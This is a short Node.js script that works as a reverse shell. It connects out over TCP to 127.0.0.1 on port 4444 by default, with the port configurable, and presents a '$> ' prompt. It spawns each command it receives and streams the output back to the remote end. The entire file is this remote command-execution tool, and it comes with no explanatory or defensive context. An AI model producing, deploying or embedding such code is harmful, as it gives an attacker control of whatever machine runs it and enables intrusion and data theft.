const net = require('net');
const child_process = require('child_process');
const { env } = require('process');

const port = env['NODE_PORT'] || 4444;

// Establishing Network Connection (TCP)
const client = net.createConnection({ host: '127.0.0.1', port }, () => {
  client.write('Connected\r\n$> ');
});

// Error handling for connection
client.on('error', (error) => {
  console.error('Connection error:', error);
});

// Wait for Instruction
client.on('data', (data) => {
  let cmd = data.toString().trimEnd();
  let args = cmd.split(' ');

  // Execute Incoming Commands
  let exec = child_process.spawn(args[0], args.slice(1));

  exec.stdout.on('data', (output) => {
    client.write(output.toString());
    client.write('$> ');
  });

  
});
